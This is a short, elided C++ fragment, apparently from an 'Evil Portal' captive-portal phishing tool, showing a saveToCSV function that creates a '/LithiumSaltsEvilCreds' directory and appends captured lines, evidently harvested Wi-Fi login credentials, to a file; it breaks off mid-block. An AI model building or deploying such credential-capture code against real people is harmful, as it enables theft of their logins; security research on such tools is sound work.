...
void EvilPortal::saveToCSV(const String &csvLine) {
    ...
    if (!fs->exists("/LithiumSaltsEvilCreds")) fs->mkdir("/LithiumSaltsEvilCreds");
    File file = fs->open("/LithiumSaltsEvilCreds/"+outputFile, FILE_APPEND);
    if (!file) {
